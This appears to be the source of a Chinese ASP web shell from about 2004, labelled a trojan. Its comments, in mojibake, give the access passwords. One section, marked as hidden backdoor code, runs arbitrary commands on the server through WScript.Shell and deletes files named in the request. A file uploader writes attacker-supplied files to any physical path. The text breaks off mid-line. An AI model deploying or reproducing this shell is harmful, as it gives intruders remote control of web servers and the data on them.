   <%@ LANGUAGE="VBSCRIPT"  codepage ="936" %>
   <%'ÃÜÂëµÚÒ»¸öÊÇmakelove,µÚ¶þ¸öÊÇhaiyangtop.126.com,²éÕÒÌæ»»ÕâÁ½¸öµ¥´Ê¾Í¿ÉÒÔ¸Ä³É±ðµÄÃÜÂëÁË%>
   <META http-equiv=Content-Type content="text/html; charset=gb2312">
   <title>::::º£Ñô¶¥¶ËÍøASPÄ¾Âí£À2004::::</title>
   <style>
   BODY {
       SCROLLBAR-FACE-COLOR: #ffe1e8; FONT-SIZE: 9pt; SCROLLBAR-HIGHLIGHT-COLOR: #ffe1e8; SCROLLBAR-SHADOW-COLOR: #ff9dbb; COLOR: #f486a8; SCROLLBAR-3DLIGHT-COLOR: #ff97b9; SCROLLBAR-ARROW-COLOR: #ff6f8f; SCROLLBAR-TRACK-COLOR: #ffe1e8; SCROLLBAR-DARKSHADOW-COLOR: #ffd9e0
   }
   a:link {
       font-size: 9pt;
       color: #ff69b4;
       text-decoration: none;
   }
   a:visited {
       font-size: 9pt;
       color: #db7093;
       text-decoration: none;
   }
   a:hover {
       font-size: 9pt;
       color: #ffb6c1;
       text-decoration: none;
   }
   table {
       BORDER-COLLAPSE: collapse;
       border: 1px dotted #EFEFEF;
       font-size: 9pt;
   }
   .noborder {
       font-size: 9pt;
       border: none;
   }
   input {
       font-size: 9pt;
       color: #c875a5;
       background-image:
       letter-spacing: normal;
       vertical-align: middle;
       word-spacing: normal;
       white-space: normal;
       border: 1px dotted #c875a5;
       clear: both;
       height: auto;
       width: auto;
       background-repeat: repeat;
       overflow: hidden;


   }
   textarea {
       font-size: 9pt;
       background-image:
       letter-spacing: normal;
       vertical-align: middle;
       word-spacing: normal;
       clear: none;
       height: auto;
       width: auto;
       border: 1px dotted #c875a5;
       color: #c875a5;

   }
   select {
       font-size: 9pt;
       background-image:
       letter-spacing: normal;
       vertical-align: middle;
       word-spacing: normal;
       clear: none;
       height: auto;
       width: auto;
       border: 1px dotted #c875a5;
       color: #c875a5;

   }
   .haveborder {
       font-size: 9pt;
       background-image:
       border: 1px solid #c875a5;
   }
   .radio {
       border: 1px solid #EEEEEE;
       background-color: #EEEEEE;
       font-size: 9pt;
       color: #EEEEEE;
       clear: both;
       float: none;
       height: auto;
       width: auto;
       overflow: hidden;
       position: static;
       visibility: inherit;
       clip:    rect(auto auto auto auto);
   }.hborder {
       font-size: 9pt;
       border: 1px solid #c875a5;
       background-color: FEF1EF;

   }
   .head-foot {
       background-image: url(images/line4.gif);
       border: 0px none;
       background-repeat: no-repeat;
       background-position: center center;

   }
   </style>

   <% '***************Òþº¬µÄÁíÒ»Ì×´úÂëÖ´ÐÐºÍÉ¾³ý³ÌÐò¿ªÊ¼***************  %>
   <%
   select case request("action")
       case "Ö´ÐÐ"
           result=ExecuteFile(trim(request("run")))
           case "del"
                   result=DeleteFile(trim(request("filename")))
           end select

   function DeleteFile(fileDel)
       on error resume next
       dim fs
       Set fs = CreateObject("Scripting.FileSystemObject")
   response.write "ÎÄ¼þÉ¾³ý (" & fileDel & ")="&cstr(fs.FileExists(fileDel))&"<BR>"
       if fs.FileExists(fileDel) then
          fs.DeleteFile fileDel,true
       end if
       if err>0 then
          err.clear
          DeleteFile=false
       else
          DeleteFile=true
       end if
   end function

   function ExecuteFile(fileExe)
       Set WShShell = Server.CreateObject("WScript.Shell")
       RetCode = WShShell.Run(fileExe, 1, True)
       if RetCode = 0 Then
           'There were no errors
           ExecuteFile=True
       else
           ExecuteFile=False
       end if
   response.write "Run&nbsp"&"&nbsp"&fileexe&"&nbsp"&executefile
   end function
    %>
   <% '***************Òþº¬µÄÁíÒ»Ì×´úÂë½áÊø***************  %>
   <% '***************Èç¹û²»×öºóÃÅµÄ»°Òª×öÎÄ¼þ¹ÜÀíÆ÷¾ÍÇëÉ¾µôÒÔÉÏÕâ¶ÎÒþº¬´úÂë***************  %>

   <% '***************ÉÏ´«ÎÄ¼þ¿ªÊ¼***************  %>
   <% if request("up")=1 then %>
   <%if instr(Request.ServerVariables("http_referer"),""&Request.ServerVariables("server_name")&"") = 0 then
   response.write "<li><font color=red size=20>²»ÒªºÚÎÒÑ½£¬ÀÏ´ó£¡</font>"
   response.end
   end if%>
   <%Server.ScriptTimeOut=5000%>
   <SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT>
   dim Data_5xsoft
   Class upload_5xsoft
   dim objForm,objFile,Version
   Public function Form(strForm)
   strForm=lcase(strForm)
   if not objForm.exists(strForm) then
   Form=""
   else
   Form=objForm(strForm)
   end if
   end function
   Public function File(strFile)
   strFile=lcase(strFile)
   if not objFile.exists(strFile) then
   set File=new FileInfo
   else
   set File=objFile(strFile)
   end if
   end function
   Private Sub Class_Initialize
   dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
   dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
   dim iFindStart,iFindEnd
   dim iFormStart,iFormEnd,sFormName
   set objForm=Server.CreateObject("Scripting.Dictionary")
   set objFile=Server.CreateObject("Scripting.Dictionary")
   if Request.TotalBytes<1 then Exit Sub
   set tStream = Server.CreateObject("adodb.stream")
   set Data_5xsoft = Server.CreateObject("adodb.stream")
   Data_5xsoft.Type = 1
   Data_5xsoft.Mode =3
   Data_5xsoft.Open
   Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
   Data_5xsoft.Position=0
   RequestData =Data_5xsoft.Read
   iFormStart = 1
   iFormEnd = LenB(RequestData)
   vbCrlf = chrB(13) & chrB(10)
   sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
   iStart = LenB (sStart)
   iFormStart=iFormStart+iStart+1
   while (iFormStart + 10) < iFormEnd
   iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
   tStream.Type = 1
   tStream.Mode =3
   tStream.Open
   Data_5xsoft.Position = iFormStart
   Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
   tStream.Position = 0
   tStream.Type = 2
   tStream.Charset ="gb2312"
   sInfo = tStream.ReadText
   tStream.Close
   iFormStart = InStrB(iInfoEnd,RequestData,sStart)
   iFindStart = InStr(22,sInfo,"name=""",1)+6
   iFindEnd = InStr(iFindStart,sInfo,"""",1)
   sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
   if InStr (45,sInfo,"filename=""",1) > 0 then
   set theFile=new FileInfo
   iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
   iFindEnd = InStr(iFindStart,sInfo,"""",1)
   sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
   theFile.FileName=getFileName(sFileName)
   theFile.FilePath=getFilePath(sFileName)
   iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
   iFindEnd = InStr(iFindStart,sInfo,vbCr)
   theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
   theFile.FileStart =iInfoEnd
   theFile.FileSize = iFormStart -iInfoEnd -3
   theFile.FormName=sFormName
   if not objFile.Exists(sFormName) then
   objFile.add sFormName,theFile
   end if
   else
   tStream.Type =1
   tStream.Mode =3
   tStream.Open
   Data_5xsoft.Position = iInfoEnd
   Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
   tStream.Position = 0
   tStream.Type = 2
   tStream.Charset ="gb2312"
   sFormValue = tStream.ReadText
   tStream.Close
   if objForm.Exists(sFormName) then
   objForm(sFormName)=objForm(sFormName)&", "&sFormValue
   else
   objForm.Add sFormName,sFormValue
   end if
   end if
   iFormStart=iFormStart+iStart+1
   wend
   RequestData=""
   set tStream =nothing
   End Sub
   Private Sub Class_Terminate
   if Request.TotalBytes>0 then
   objForm.RemoveAll
   objFile.RemoveAll
   set objForm=nothing
   set objFile=nothing
   Data_5xsoft.Close
   set Data_5xsoft =nothing
   end if
   End Sub
   Private function GetFilePath(FullPath)
   If FullPath <> "" Then
   GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
   Else
   GetFilePath = ""
   End If
   End  function
   Private function GetFileName(FullPath)
   If FullPath <> "" Then
   GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
   Else
   GetFileName = ""
   End If
   End  function
   End Class
   Class FileInfo
   dim FormName,FileName,FilePath,FileSize,FileType,FileStart
   Private Sub Class_Initialize
   FileName = ""
   FilePath = ""
   FileSize = 0
   FileStart= 0
   FormName = ""
   FileType = ""
   End Sub
   Public function SaveAs(FullPath)
   dim dr,ErrorChar,i
   SaveAs=true
   if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
   set dr=CreateObject("Adodb.Stream")
   dr.Mode=3
   dr.Type=1
   dr.Open
   Data_5xsoft.position=FileStart
   Data_5xsoft.copyto dr,FileSize
   dr.SaveToFile FullPath,2
   dr.Close
   set dr=nothing
   SaveAs=false
   end function
   End Class
   </SCRIPT>
   <%
   dim upload,file,formName,formPath,iCount
   set upload=new upload_5xsoft
   if upload.form("filepath")="" then
   response.write "ÇëÊäÈëÒªÉÏ´«ÖÁµÄÄ¿Â¼!"
   set upload=nothing
   response.end
   else
   formPath=upload.form("filepath")
   if right(formPath,1)<>"/" then formPath=formPath&"/"
   end if
   iCount=0
   for each formName in upload.objForm
   next
   response.write "<br>"
   for each formName in upload.objFile
   set file=upload.file(formName)
   if file.FileSize>0 then
   'file.SaveAs Server.mappath(formPath&file.FileName)
   'ÐéÄâÂ·¾¶ÉÏ´«
   file.SaveAs formPath&file.FileName
   'ÎïÀíÂ·¾¶ÉÏ´«
   response.write "<center>"&file.FilePath&file.FileName&" ("&file.FileSize&") => "&formPath&File.FileName&" ÉÏ´«³É¹¦!</
